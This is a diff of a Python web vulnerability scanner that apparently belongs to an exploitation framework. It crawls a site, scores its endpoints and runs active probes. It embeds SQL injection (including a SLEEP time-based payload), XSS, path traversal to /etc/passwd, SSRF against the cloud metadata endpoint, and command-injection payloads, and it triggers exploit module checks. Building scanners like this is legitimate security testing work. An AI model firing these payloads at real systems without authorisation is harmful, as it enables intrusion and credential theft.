+            absolute = urljoin(self.base_url, match.group(1).strip())
+            normalized = self._canonicalize_url(absolute)
+            if normalized and self._should_visit_url(normalized):
+                self.crawled_urls.add(normalized)
+
+    def _build_endpoint_inventory(self) -> List[Dict[str, Any]]:
+        endpoint_map: Dict[Tuple[str, str], Dict[str, Any]] = {}
+
+        for url in sorted(self.crawled_urls):
+            parsed = urlparse(url)
+            query_params = {key: value for key, value in parse_qsl(parsed.query, keep_blank_values=True)}
+            self._merge_endpoint(endpoint_map, url, "GET", query_params, discovered_from="crawl")
+
+            page = self._get_page(url)
+            if not page or page["status_code"] != 200:
+                continue
+
+            for form in self._extract_forms(url, page["text"], page.get("content_type", "")):
+                self._merge_endpoint(
+                    endpoint_map,
+                    form["url"],
+                    form["method"],
+                    form["params"],
+                    discovered_from="form",
+                    source_page=url,
+                    enctype=form["enctype"],
+                )
+
+        endpoints = list(endpoint_map.values())
+        for entry in endpoints:
+            entry["has_params"] = bool(entry["params"])
+            entry["interesting_score"] = self._score_endpoint(entry)
+            entry["source_pages"] = sorted(entry["source_pages"])
+            entry["discovered_from"] = sorted(entry["discovered_from"])
+
+        endpoints.sort(
+            key=lambda entry: (
+                not entry["has_params"],
+                -entry["interesting_score"],
+                entry["url"],
+                entry["method"],
+            )
+        )
+        return endpoints[: self.max_urls]
+
+    def _merge_endpoint(
+        self,
+        endpoint_map: Dict[Tuple[str, str], Dict[str, Any]],
+        url: str,
+        method: str,
+        params: Dict[str, Any],
+        discovered_from: str,
+        source_page: str = "",
+        enctype: str = "",
+    ):
+        normalized = self._canonicalize_url(url)
+        if not normalized or not self._should_visit_url(normalized):
+            return
+
+        clean_url = self._strip_query(normalized)
+        key = (clean_url, method.upper())
+        parsed = urlparse(clean_url)
+
+        if key not in endpoint_map:
+            endpoint_map[key] = {
+                "url": clean_url,
+                "path": parsed.path or "/",
+                "method": method.upper(),
+                "params": {},
+                "enctype": enctype or "",
+                "source_pages": set(),
+                "discovered_from": set(),
+            }
+
+        entry = endpoint_map[key]
+        if source_page:
+            entry["source_pages"].add(source_page)
+        entry["discovered_from"].add(discovered_from)
+        if enctype and not entry["enctype"]:
+            entry["enctype"] = enctype
+
+        for name, value in (params or {}).items():
+            if value is None:
+                value = ""
+            if name not in entry["params"] or not entry["params"][name]:
+                entry["params"][name] = str(value)
+
+    def _extract_forms(self, page_url: str, text: str, content_type: str = "") -> List[Dict[str, Any]]:
+        if self._looks_like_xml(page_url, text, content_type):
+            return []
+
+        forms = []
+        soup = self._get_soup(page_url, text, content_type)
+        for form in soup.find_all("form"):
+            action = form.get("action") or page_url
+            absolute = self._canonicalize_url(urljoin(page_url, action))
+            if not absolute or not self._same_origin(absolute):
+                continue
+            method = (form.get("method") or "GET").upper()
+            if method not in {"GET", "POST"}:
+                method = "POST"
+            params = {}
+            for field in form.find_all(["input", "textarea", "select"]):
+                name = field.get("name")
+                if not name:
+                    continue
+                value = field.get("value", "")
+                if field.name == "textarea" and not value:
+                    value = field.text or ""
+                if field.name == "select" and not value:
+                    option = field.find("option", selected=True) or field.find("option")
+                    value = option.get("value", "") if option else ""
+                if field.get("type") in {"checkbox", "radio"} and not field.has_attr("checked") and not value:
+                    value = "on"
+                params[name] = value or "test"
+            forms.append(
+                {
+                    "url": absolute,
+                    "method": method,
+                    "params": params,
+                    "enctype": form.get("enctype", ""),
+                }
+            )
+        return forms
+
+    def _score_endpoint(self, entry: Dict[str, Any]) -> int:
+        score = 0
+        path = entry["path"].lower()
+        params = [name.lower() for name in entry["params"].keys()]
+        if entry["has_params"]:
+            score += 35
+        if entry["method"] == "POST":
+            score += 10
+        if any(token in path for token in ["admin", "ajax", "api", "debug", "graphql", "search", "upload"]):
+            score += 10
+        ext = os.path.splitext(path)[1]
+        if ext in {".php", ".asp", ".aspx", ".cgi", ".jsp"}:
+            score += 12
+        for name in params:
+            if any(name == hint or hint in name for hints in ACTIVE_PARAM_HINTS.values() for hint in hints):
+                score += 5
+        return score
+
+    def _detect_technologies(self):
+        check_urls = [entry["url"] for entry in self.endpoint_inventory[:25]] or [self.target_url]
+        for url in check_urls:
+            page = self._get_page(url)
+            if not page:
+                continue
+
+            headers = {str(key).lower(): str(value).lower() for key, value in page["headers"].items()}
+            body = (page["text"] or "").lower()
+
+            for header_name in ["server", "x-powered-by", "x-generator", "via"]:
+                value = headers.get(header_name)
+                if not value:
+                    continue
+                tokens = re.split(r"[^a-z0-9.+_-]", value)
+                for token in tokens:
+                    token = token.strip(".- ")
+                    if len(token) < 2:
+                        continue
+                    self._register_technology(token, url)
+                if "apache" in value:
+                    self._register_technology("apache", url)
+                if "nginx" in value:
+                    self._register_technology("nginx", url)
+                if "php" in value:
+                    self._register_technology("php", url)
+                if "iis" in value:
+                    self._register_technology("iis", url)
+                if "tomcat" in value:
+                    self._register_technology("tomcat", url)
+                if "ubuntu" in value:
+                    self._register_technology("linux", url)
+                if "win" in value:
+                    self._register_technology("windows", url)
+
+            for tech, signatures in TECH_BODY_SIGNATURES.items():
+                if any(signature in body for signature in signatures):
+                    self._register_technology(tech, url)
+
+    def _register_technology(self, tech: str, url: str):
+        normalized = re.sub(r"[^a-z0-9.+_-]", "", tech.lower()).strip()
+        if not normalized:
+            return
+        self.tech_tokens.add(normalized)
+        self.technologies[normalized].add(url)
+
+    def _run_passive_scanners(self) -> int:
+        scanner_paths = self._passive_scanner_paths()
+        self.passive_scanner_paths = set(scanner_paths)
+        hits = 0
+        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
+            futures = {executor.submit(self._run_passive_scanner, mod_path): mod_path for mod_path in scanner_paths}
+            for future in as_completed(futures):
+                try:
+                    if future.result():
+                        hits += 1
+                except Exception as exc:
+                    self._verbose(f"Passive detector failed: {exc}")
+        return hits
+
+    def _passive_scanner_paths(self) -> List[str]:
+        if self.framework and hasattr(self.framework, "module_loader"):
+            try:
+                discovered = self.framework.module_loader.discover_modules()
+                scanners = sorted(path for path in discovered if path.startswith("scanner/http/"))
+                if scanners:
+                    return scanners
+            except Exception as exc:
+                self._verbose(f"Unable to enumerate scanner/http modules dynamically: {exc}")
+        return list(PASSIVE_SCANNERS)
+
+    def _run_passive_scanner(self, mod_path: str) -> bool:
+        module = self._load_and_configure_http_module(mod_path)
+        if not module:
+            return False
+
+        try:
+            result = module.run() if hasattr(module, "run") else module.check()
+        except Exception as exc:
+            self._verbose(f"{mod_path} raised an exception: {exc}")
+            return False
+
+        positive, reason, confidence = self._module_result_details(module, result)
+        if not positive:
+            return False
+
+        severity = self._normalize_severity(
+            (getattr(module, "vulnerability_info", {}) or {}).get("severity")
+            or getattr(module, "__info__", {}).get("severity")
+            or "info"
+        )
+        evidence = reason or module.description or "Passive detector reported a match"
+        info = getattr(module, "vulnerability_info", {}) or {}
+        linked = getattr(module, "__info__", {}).get("modules", []) or []
+        for linked_module in linked:
+            self.linked_modules.add(linked_module)
+        if not self._passive_result_matches_stack(mod_path, evidence, info):
+            self._verbose(f"Ignoring passive hit from {mod_path}: contradicted by detected stack")
+            return False
+        self._derive_tech_from_module(mod_path, evidence)
+        added = self._record_result(
+            source="passive",
+            name=module.name or mod_path.split("/")[-1],
+            module=mod_path,
+            url=self.target_url,
+            method="GET",
+            severity=severity,
+            confidence=confidence or self._default_confidence_for_severity(severity),
+            evidence=evidence,
+            metadata=info,
+            signal=self._signal_from_path(mod_path),
+        )
+        return bool(added)
+
+    def _passive_result_matches_stack(self, mod_path: str, evidence: str, info: Dict[str, Any]) -> bool:
+        lower = f"{mod_path} {evidence} {info}".lower()
+
+        contradictory_frameworks = {
+            "django": "wordpress",
+            "flask": "wordpress",
+            "joomla": "wordpress",
+            "drupal": "wordpress",
+        }
+
+        for framework, contradiction in contradictory_frameworks.items():
+            if framework in lower and contradiction in self.tech_tokens and framework not in self.tech_tokens:
+                return False
+        return True
+
+    def _run_active_scans(self) -> int:
+        targets = [entry for entry in self.endpoint_inventory if entry.get("has_params")]
+        if not targets:
+            print_warning("No parameterized endpoints found for active probing")
+            return 0
+
+        limit = 60 if self.aggressive else 25
+        selected = targets[:limit]
+        hits = 0
+
+        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as executor:
+            futures = {executor.submit(self._scan_endpoint, entry): entry for entry in selected}
+            for future in as_completed(futures):
+                try:
+                    hits += future.result()
+                except Exception as exc:
+                    self._verbose(f"Active scan worker failed: {exc}")
+        return hits
+
+    def _scan_endpoint(self, entry: Dict[str, Any]) -> int:
+        hits = 0
+        baseline_resp, baseline_time = self._send_entry_request(entry, dict(entry["params"]))
+        if not baseline_resp:
+            return 0
+
+        for param in sorted(entry["params"].keys()):
+            if not self._should_probe_param(param):
+                continue
+
+            for attack in self._candidate_attacks(param, entry):
+                if attack == "sqli":
+                    hits += self._probe_sqli(entry, param, baseline_resp, baseline_time)
+                elif attack == "xss":
+                    hits += self._probe_xss(entry, param)
+                elif attack == "lfi":
+                    hits += self._probe_lfi(entry, param)
+                elif attack == "ssrf":
+                    hits += self._probe_ssrf(entry, param)
+                elif attack == "rce" and self.aggressive:
+                    hits += self._probe_rce(entry, param)
+        return hits
+
+    def _should_probe_param(self, param: str) -> bool:
+        name = param.lower()
+        if name in SKIP_PARAM_KEYWORDS:
+            return False
+        if any(keyword in name for keyword in SKIP_PARAM_KEYWORDS):
+            return False
+        return True
+
+    def _candidate_attacks(self, param: str, entry: Dict[str, Any]) -> List[str]:
+        name = param.lower()
+        attacks = []
+        for attack, hints in ACTIVE_PARAM_HINTS.items():
+            if any(name == hint or hint in name for hint in hints):
+                attacks.append(attack)
+
+        if not attacks:
+            attacks.extend(["xss", "sqli"])
+
+        if "xml" in entry["path"].lower() and "xxe" not in attacks:
+            attacks.append("xxe")
+
+        if "php" in self.tech_tokens and ("lfi" in attacks or "rce" in attacks):
+            attacks.append("rce")
+
+        deduped = []
+        for attack in attacks:
+            if attack not in deduped:
+                deduped.append(attack)
+        return deduped
+
+    def _probe_sqli(self, entry: Dict[str, Any], param: str, baseline_resp, baseline_time: float) -> int:
+        hits = 0
+        original = entry["params"].get(param, "") or "1"
+        error_payload = f"{original}'"
+        error_resp, _ = self._send_entry_request(entry, self._mutated_params(entry, param, error_payload))
+        if error_resp and self._contains_sqli_error(error_resp.text):
+            hits += self._record_result(
+                source="active",
+                name="SQL Injection (error-based)",
+                url=entry["url"],
+                method=entry["method"],
+                parameter=param,
+                severity="high",
+                confidence=92,
+                evidence="Database error signature appeared after a quote-based payload",
+                payload=error_payload,
+                repro=self._build_repro_command(entry, param, error_payload),
+                signal="sqli",
+            )
+
+        true_payload = f"{original} AND 1=1"
+        false_payload = f"{original} AND 1=2"
+        true_resp, _ = self._send_entry_request(entry, self._mutated_params(entry, param, true_payload))
+        false_resp, _ = self._send_entry_request(entry, self._mutated_params(entry, param, false_payload))
+        boolean_evidence = self._boolean_sqli_evidence(baseline_resp, true_resp, false_resp)
+        if boolean_evidence:
+            hits += self._record_result(
+                source="active",
+                name="SQL Injection (boolean-based)",
+                url=entry["url"],
+                method=entry["method"],
+                parameter=param,
+                severity="high",
+                confidence=78,
+                evidence=boolean_evidence,
+                payload=false_payload,
+                repro=self._build_repro_command(entry, param, false_payload),
+                signal="sqli",
+            )
+
+        if self.aggressive and not self.waf_detected:
+            time_payload = f"{original}' AND SLEEP(5)-- "
+            _, elapsed = self._send_entry_request(
+                entry,
+                self._mutated_params(entry, param, time_payload),
+                timeout=max(self.timeout + 5, 8),
+            )
+            if elapsed and elapsed >= max(baseline_time + 3.5, 4.8):
+                hits += self._record_result(
+                    source="active",
+                    name="SQL Injection (time-based)",
+                    url=entry["url"],
+                    method=entry["method"],
+                    parameter=param,
+                    severity="high",
+                    confidence=86,
+                    evidence=f"Delayed response observed ({elapsed:.2f}s vs baseline {baseline_time:.2f}s)",
+                    payload=time_payload,
+                    repro=self._build_repro_command(entry, param, time_payload),
+                    signal="sqli",
+                )
+        return hits
+
+    def _probe_xss(self, entry: Dict[str, Any], param: str) -> int:
+        marker = "KSPXSS"
+        payload = f"{marker}<svg/onload=alert(1)>"
+        response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
+        if not response:
+            return 0
+
+        body = response.text or ""
+        reflected = payload in body
+        escaped = html.escape(payload) in body or payload.replace("<", "&lt;") in body
+        if reflected and not escaped:
+            return self._record_result(
+                source="active",
+                name="Reflected XSS",
+                url=entry["url"],
+                method=entry["method"],
+                parameter=param,
+                severity="high",
+                confidence=88,
+                evidence="Payload reflected in the response without HTML escaping",
+                payload=payload,
+                repro=self._build_repro_command(entry, param, payload),
+                signal="xss",
+            )
+        return 0
+
+    def _probe_lfi(self, entry: Dict[str, Any], param: str) -> int:
+        payloads = [
+            "../../../../etc/passwd",
+            "..\\..\\..\\windows\\win.ini",
+        ]
+        for payload in payloads:
+            response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
+            if not response:
+                continue
+            evidence = self._lfi_evidence(response.text or "")
+            if evidence:
+                return self._record_result(
+                    source="active",
+                    name="Local File Inclusion",
+                    url=entry["url"],
+                    method=entry["method"],
+                    parameter=param,
+                    severity="high",
+                    confidence=95,
+                    evidence=evidence,
+                    payload=payload,
+                    repro=self._build_repro_command(entry, param, payload),
+                    signal="lfi",
+                )
+        return 0
+
+    def _probe_ssrf(self, entry: Dict[str, Any], param: str) -> int:
+        payload = "http://169.254.169.254/latest/meta-data/"
+        response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
+        if not response:
+            return 0
+
+        body = (response.text or "").lower()
+        indicators = [
+            "instance-id",
+            "ami-id",
+            "meta-data",
+            "security-credentials",
+            "iam/info",
+        ]
+        error_indicators = [
+            "connection refused",
+            "econnrefused",
+            "no route to host",
+            "timed out",
+            "dial tcp",
+        ]
+
+        if any(indicator in body for indicator in indicators):
+            return self._record_result(
+                source="active",
+                name="Potential SSRF",
+                url=entry["url"],
+                method=entry["method"],
+                parameter=param,
+                severity="high",
+                confidence=84,
+                evidence="Response contains cloud metadata keywords after an internal URL probe",
+                payload=payload,
+                repro=self._build_repro_command(entry, param, payload),
+                signal="ssrf",
+            )
+
+        if self.aggressive and any(indicator in body for indicator in error_indicators):
+            return self._record_result(
+                source="active",
+                name="Potential SSRF",
+                url=entry["url"],
+                method=entry["method"],
+                parameter=param,
+                severity="medium",
+                confidence=66,
+                evidence="Backend-side connection error surfaced after an internal URL probe",
+                payload=payload,
+                repro=self._build_repro_command(entry, param, payload),
+                signal="ssrf",
+            )
+        return 0
+
+    def _probe_rce(self, entry: Dict[str, Any], param: str) -> int:
+        marker = f"KSP_RCE_{int(time.time())}"
+        payloads = [f";echo {marker}", f"&& echo {marker}", f"| echo {marker}"]
+        for payload in payloads:
+            response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
+            if response and marker in (response.text or ""):
+                return self._record_result(
+                    source="active",
+                    name="Command Injection",
+                    url=entry["url"],
+                    method=entry["method"],
+                    parameter=param,
+                    severity="critical",
+                    confidence=99,
+                    evidence="Command marker echoed back in the server response",
+                    payload=payload,
+                    repro=self._build_repro_command(entry, param, payload),
+                    signal="rce",
+                )
+        return 0
+
+    def _send_entry_request(
+        self,
+        entry: Dict[str, Any],
+        params: Dict[str, Any],
+        timeout: Optional[int] = None,
+    ) -> Tuple[Optional[Any], float]:
+        try:
+            started = time.monotonic()
+            timeout = timeout or self.timeout
+            if entry["method"] == "POST":
+                response = self.session.post(
+                    entry["url"],
+                    data=params,
+                    timeout=timeout,
+                    allow_redirects=True,
+                    verify=False,
+                )
+            else:
+                response = self.session.get(
+                    entry["url"],
+                    params=params,
+                    timeout=timeout,
+                    allow_redirects=True,
+                    verify=False,
+                )
+            return response, time.monotonic() - started
+        except Exception as exc:
+            self._verbose(f"Probe failed for {entry['url']} ({entry['method']}): {exc}")
+            return None, 0.0
+
+    def _mutated_params(self, entry: Dict[str, Any], param: str, payload: str) -> Dict[str, Any]:
+        params = dict(entry["params"])
+        params[param] = payload
+        return params
+
+    def _contains_sqli_error(self, text: str) -> bool:
+        lowered = (text or "").lower()
+        return any(error in lowered for error in SQLI_ERRORS)
+
+    def _boolean_sqli_evidence(self, baseline_resp, true_resp, false_resp) -> str:
+        if not baseline_resp or not true_resp or not false_resp:
+            return ""
+
+        baseline_len = len(baseline_resp.text or "")
+        true_len = len(true_resp.text or "")
+        false_len = len(false_resp.text or "")
+        delta_true = abs(true_len - baseline_len)
+        delta_false = abs(false_len - true_len)
+
+        if (
+            baseline_resp.status_code == true_resp.status_code
+            and abs(false_resp.status_code - baseline_resp.status_code) <= 1
+            and delta_true <= max(60, int(baseline_len * 0.08))
+            and delta_false >= max(120, int(max(true_len, false_len) * 0.12))
+        ):
+            return (
+                "Boolean response drift detected "
+                f"(baseline={baseline_len}, true={true_len}, false={false_len})"
+            )
+        return ""
+
+    def _lfi_evidence(self, text: str) -> str:
+        lowered = (text or "").lower()
+        if any(marker in lowered for marker in (marker.lower() for marker in LINUX_LFI_MARKERS)):
+            return "Response looks like /etc/passwd content"
+        if any(marker in lowered for marker in (marker.lower() for marker in WINDOWS_LFI_MARKERS)):
+            return "Response looks like win.ini content"
+        return ""
+
+    def _select_followup_modules(self, module_patterns: List[str]) -> List[Dict[str, Any]]:
+        if not self.framework or not hasattr(self.framework, "module_loader"):
+            return []
+
+        discovered = self.framework.module_loader.discover_modules()
+        signals = {result["signal"] for result in self.results if result.get("signal")}
+        patterns = [pattern.strip().lower() for pattern in module_patterns if pattern.strip()]
+        candidates = []
+
+        for mod_path in sorted(discovered.keys()):
+            lower = mod_path.lower()
+            if not self._is_http_followup_module(lower):
+                continue
+            if mod_path in self.passive_scanner_paths or mod_path in self.executed_modules:
+                continue
+            if "bruteforce" in lower:
+                continue
+
+            score = 0
+            if mod_path in self.linked_modules:
+                score += 120
+
+            if not patterns or patterns == ["all"]:
+                score += 5
+            elif any(pattern in lower for pattern in patterns):
+                score += 70
+            elif mod_path not in self.linked_modules:
+                continue
+
+            for tech in self.tech_tokens:
+                if tech in lower:
+                    score += 25
+            for signal in signals:
+                if signal in lower:
+                    score += 20
+
+            if "http" in lower:
+                score += 10
+
+            if score >= 35:
+                candidates.append({"path": mod_path, "score": score})
+
+        candidates.sort(key=lambda item: item["score"], reverse=True)
+        return candidates[: max(10, self.max_modules * 4)]
+
+    def _is_http_followup_module(self, module_path: str) -> bool:
+        prefixes = (
+            "scanner/http/",
+            "auxiliary/scanner/http/",
+            "exploits/http/",
+            "exploits/linux/http/",
+            "exploits/multi/http/",
+        )
+        return module_path.startswith(prefixes)
+
+    def _run_followup_checks(self, candidates: List[Dict[str, Any]]):
+        with ThreadPoolExecutor(max_workers=min(self.threads, len(candidates) or 1)) as executor:
+            futures = {
+                executor.submit(self._run_followup_module, candidate["path"], candidate["score"]): candidate["path"]
+                for candidate in candidates
+            }
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception as exc:
+                    self._verbose(f"Follow-up check failed: {exc}")
+
+    def _run_followup_module(self, mod_path: str, score: int):
+        module = self._load_and_configure_http_module(mod_path)
+        if not module:
+            return
+
+        result = None
+        if hasattr(module, "check"):
+            try:
+                result = module.check()
+            except Exception as exc:
+                self._verbose(f"{mod_path}.check() failed: {exc}")
+                return
+        elif mod_path.startswith("scanner/http/") and hasattr(module, "run"):
+            try:
+                result = module.run()
+            except Exception as exc:
+                self._verbose(f"{mod_path}.run() failed: {exc}")
+                return
         else:
-            print_success(f"[VULN] {kwargs.get('attack')} - {kwargs.get('parameter')} on {kwargs.get('url')}")
+            return
+
+        positive, reason, confidence = self._module_result_details(module, result)
+        if not positive:
+            return
+
+        info = getattr(module, "vulnerability_info", {}) or {}
+        severity = self._normalize_severity(info.get("severity") or "info")
+        if mod_path.startswith("exploits/") and severity == "info":
+            severity = "high"
+        self._record_result(
+            source="followup",
+            name=module.name or mod_path.split("/")[-1],
+            module=mod_path,
+            url=self.target_url,
+            method="CHECK",
+            severity=severity,
+            confidence=confidence or min(95, 70 + min(score, 25)),
+            evidence=reason or f"Follow-up module check positive (score={score})",
+            metadata=info,
+            signal=self._signal_from_path(mod_path),
+        )
+
+    def _load_and_configure_http_module(self, mod_path: str):
+        if not self.framework or not hasattr(self.framework, "module_loader"):
+            return None
+
+        try:
+            module = self.framework.module_loader.load_module(mod_path, framework=self.framework, silent=True)
+        except TypeError:
+            module = self.framework.module_loader.load_module(mod_path, framework=self.framework)
+        if not module:
+            return None
+
+        self.executed_modules.add(mod_path)
+        self._configure_http_module(module)
+        return module
+
+    def _configure_http_module(self, module):
+        parsed = self.target_parts
+        host = parsed.hostname or ""
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        ssl = parsed.scheme == "https"
+        path = parsed.path or "/"
+
+        self._set_module_candidates(module, ["target", "rhost", "rhosts", "RHOST", "RHOSTS"], host)
+        self._set_module_candidates(module, ["port", "rport", "RPORT"], port)
+        self._set_module_candidates(module, ["ssl", "SSL"], ssl)
+        self._set_module_candidates(module, ["path", "PATH"], path)
+        self._set_module_candidates(module, ["targeturi", "TARGETURI", "uri", "URI"], path)
+        self._set_module_candidates(module, ["TARGET", "target_url", "base_url"], self.base_url)
+        self._set_module_candidates(
+            module,
+            ["user_agent", "USER_AGENT"],
+            self.session.headers.get("User-Agent", "Mozilla/5.0"),
+        )
+        self._set_module_candidates(module, ["timeout", "TIMEOUT"], self.timeout)
+        self._set_module_candidates(module, ["verify_ssl", "VERIFY_SSL"], False)
+        self._set_module_candidates(module, ["follow_redirects", "FOLLOW_REDIRECTS"], True)
+
+        if hasattr(module, "_configure_session"):
+            try:
+                module._configure_session()
+            except Exception:
+                pass
+
+        if hasattr(module, "session") and self.session:
+            try:
+                module.session.headers.update(self.session.headers)
+                module.session.verify = False
+                module.session.proxies = dict(getattr(self.session, "proxies", {}) or {})
+            except Exception:
+                pass
+
+    def _set_module_candidates(self, module, options: List[str], value: Any):
+        for option in options:
+            if self._set_module_value(module, option, value):
+                return
+
+    def _set_module_value(self, module, option: str, value: Any) -> bool:
+        if hasattr(module, "set_option") and module.set_option(option, value):
+            return True
+        if hasattr(module, option):
+            try:
+                attr = getattr(type(module), option, None)
+                if attr is not None and hasattr(attr, "__set__"):
+                    attr.__set__(module, value)
+                else:
+                    setattr(module, option, value)
+                return True
+            except Exception:
+                return False
+        return False
+
+    def _module_result_details(self, module, result: Any) -> Tuple[bool, str, int]:
+        if isinstance(result, dict):
+            positive = bool(result.get("vulnerable", result.get("success", False)))
+            reason = result.get("reason") or result.get("message") or ""
+            confidence = self._normalize_confidence(result.get("confidence"))
+            return positive, reason, confidence
+
+        if isinstance(result, bool):
+            info = getattr(module, "vulnerability_info", {}) or {}
+            reason = info.get("reason") or ""
+            severity = info.get("severity") or getattr(module, "__info__", {}).get("severity") or "info"
+            return result, reason, self._default_confidence_for_severity(self._normalize_severity(severity))
+
+        return bool(result), "", 0
+
+    def _derive_tech_from_module(self, mod_path: str, evidence: str):
+        lower = f"{mod_path} {evidence}".lower()
+        for tech in [
+            "wordpress",
+            "joomla",
+            "drupal",
+            "django",
+            "flask",
+            "phpmyadmin",
+            "grafana",
+            "kibana",
+            "tomcat",
+            "jenkins",
+            "graphql",
+            "swagger",
+            "apache",
+            "nginx",
+            "php",
+        ]:
+            if tech in lower:
+                self._register_technology(tech, self.target_url)
+
+    def _record_result(
+        self,
+        *,
+        source: str,
+        name: str,
+        url: str,
+        method: str,
+        severity: str,
+        confidence: int,
+        evidence: str,
+        parameter: str = "",
+        payload: str = "",
+        repro: str = "",
+        module: str = "",
+        metadata: Optional[Dict[str, Any]] = None,
+        signal: str = "",
+    ) -> int:
+        severity = self._normalize_severity(severity)
+        confidence = self._normalize_confidence(confidence)
+        if confidence < self.min_confidence:
+            return 0
+
+        key = (
+            name,
+            url,
+            method,
+            parameter,
+            (evidence or "").strip().lower()[:160],
+            (payload or "")[:80],
+        )
+        with self.results_lock:
+            if key in self.result_keys:
+                return 0
+            self.result_keys.add(key)
+            result = {
+                "source": source,
+                "name": name,
+                "module": module,
+                "url": url,
+                "method": method,
+                "parameter": parameter,
+                "severity": severity,
+                "confidence": confidence,
+                "evidence": evidence,
+                "payload": payload,
+                "repro": repro,
+                "metadata": metadata or {},
+                "signal": signal or self._signal_from_name(name),
+                "timestamp": time.time(),
+            }
+            self.results.append(result)
+
+        prefix = f"[{severity.upper()}]"
+        if parameter:
+            print_success(f"{prefix} {name} on {url} ({method} {parameter}, confidence={confidence}%)")
+        else:
+            print_success(f"{prefix} {name} on {url} (confidence={confidence}%)")
+        return 1
 
     def _display_results(self):
         if not self.results:
-            print_warning("No vulnerabilities found.")
+            print_warning("No vulnerability reached the configured confidence threshold.")
+            if self.followup_candidates:
+                print_info("Suggested follow-up modules:")
+                for candidate in self.followup_candidates[:8]:
+                    print_info(f"  - {candidate['path']} (score={candidate['score']})")
             return
-        
-        print_success("--- SCAN RESULTS ---")
-        for res in self.results:
-            if 'module' in res:
-                print_info(f"Module: {res['module']}")
-                print_info(f"Target: {res['url']}")
-                print_info(f"Status: {res.get('status', 'Detected')}")
-                if 'message' in res: print_info(f"Details: {res['message']}")
-            else:
-                print_info(f"Type: {res['attack']}")
-                print_info(f"URL: {res['url']}")
-                print_info(f"Param: {res['parameter']}")
-                print_info(f"Evidence: {res['evidence']}")
-                if 'payload' in res:
-                    print_info(f"Payload: {res['payload']}")
-                    # Generate Repro
-                    cmd = f"curl -i -s"
-                    if res.get('method') == 'POST':
-                        cmd += f" -X POST -d \"{res['parameter']}={res['payload']}\""
-                    else:
-                        sep = '&' if '?' in res['url'] else '?'
-                        cmd += f" \"{res['url']}{sep}{res['parameter']}={urllib.parse.quote(res['payload'])}\""
-                    print_info(f"Reproduction: {cmd}")
-            print_info("-" * 30)
 
-from itertools import chain
+        ordered = sorted(
+            self.results,
+            key=lambda result: (
+                -SEVERITY_ORDER.get(result["severity"], 0),
+                -result["confidence"],
+                result["name"],
+                result["url"],
+            ),
+        )
 
+        counts_by_severity = defaultdict(int)
+        counts_by_source = defaultdict(int)
+        for result in ordered:
+            counts_by_severity[result["severity"]] += 1
+            counts_by_source[result["source"]] += 1
+
+        sev_summary = ", ".join(
+            f"{severity}={counts_by_severity[severity]}"
+            for severity in ["critical", "high", "medium", "low", "info"]
+            if counts_by_severity[severity]
+        )
+        src_summary = ", ".join(f"{source}={count}" for source, count in sorted(counts_by_source.items()))
+        print_success(f"Findings: {len(ordered)} | {sev_summary}")
+        if src_summary:
+            print_info(f"Sources: {src_summary}")
+
+        for result in ordered[:20]:
+            line = (
+                f"[{result['severity'].upper()}] {result['name']} | {result['url']} "
+                f"| method={result['method']} | confidence={result['confidence']}%"
+            )
+            if result.get("parameter"):
+                line += f" | parameter={result['parameter']}"
+            print_info(line)
+            if result.get("module"):
+                print_info(f"  module: {result['module']}")
+            if result.get("evidence"):
+                print_info(f"  evidence: {result['evidence']}")
+            if result.get("payload"):
+                print_info(f"  payload: {result['payload']}")
+            if result.get("repro"):
+                print_info(f"  repro: {result['repro']}")
+
+        if len(ordered) > 20:
+            print_info(f"... {len(ordered) - 20} additional findings omitted from console summary")
+
+        if self.followup_candidates:
+            print_info("Recommended follow-up modules:")
+            for candidate in self.followup_candidates[:10]:
+                print_info(f"  - {candidate['path']} (score={candidate['score']})")
+
+    def _write_json_report(self, report_path: str):
+        abs_path = os.path.abspath(report_path)
+        directory = os.path.dirname(abs_path)
+        if directory:
+            os.makedirs(directory, exist_ok=True)
+
+        report = {
+            "target": self.target_url,
+            "base_url": self.base_url,
+            "started_at": self.scan_started_at,
+            "finished_at": time.time(),
+            "waf_detected": self.waf_detected,
+            "technologies": {tech: sorted(urls) for tech, urls in sorted(self.technologies.items())},
+            "crawled_urls": sorted(self.crawled_urls),
+            "endpoints": [
+                {
+                    "url": entry["url"],
+                    "path": entry["path"],
+                    "method": entry["method"],
+                    "params": entry["params"],
+                    "has_params": entry["has_params"],
+                    "interesting_score": entry["interesting_score"],
+                    "source_pages": entry["source_pages"],
+                    "discovered_from": entry["discovered_from"],
+                }
+                for entry in self.endpoint_inventory
+            ],
+            "results": self.results,
+            "recommended_modules": self.followup_candidates,
+        }
+
+        with open(abs_path, "w", encoding="utf-8") as handle:
+            json.dump(report, handle, indent=2, sort_keys=True)
+
+    def _strip_query(self, url: str) -> str:
+        parsed = urlparse(url)
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
+
+    def _build_repro_command(self, entry: Dict[str, Any], param: str, payload: str) -> str:
+        params = dict(entry["params"])
+        params[param] = payload
+        if entry["method"] == "POST":
+            body = urlencode(params, doseq=True)
+            return f"curl -isk -X POST --data '{body}' '{entry['url']}'"
+        query = urlencode(params, doseq=True)
+        return f"curl -isk '{entry['url']}?{query}'"
+
+    def _normalize_severity(self, severity: Any) -> str:
+        normalized = str(severity or "info").strip().lower()
+        if normalized not in SEVERITY_ORDER:
+            return "info"
+        return normalized
+
+    def _default_confidence_for_severity(self, severity: str) -> int:
+        return {
+            "critical": 98,
+            "high": 88,
+            "medium": 80,
+            "low": 74,
+            "info": 70,
+        }.get(self._normalize_severity(severity), 60)
+
+    def _normalize_confidence(self, confidence: Any) -> int:
+        if isinstance(confidence, str):
+            mapping = {"low": 60, "medium": 78, "high": 92}
+            if confidence.lower() in mapping:
+                return mapping[confidence.lower()]
+            try:
+                confidence = int(confidence)
+            except ValueError:
+                return 0
+        if isinstance(confidence, (int, float)):
+            return max(0, min(100, int(confidence)))
+        return 0
+
+    def _signal_from_name(self, name: str) -> str:
+        lowered = (name or "").lower()
+        for signal in ["rce", "sqli", "sql", "xss", "lfi", "ssrf", "xxe", "wordpress", "joomla", "drupal"]:
+            if signal in lowered:
+                return signal.replace("sql", "sqli") if signal == "sql" else signal
+        return ""
+
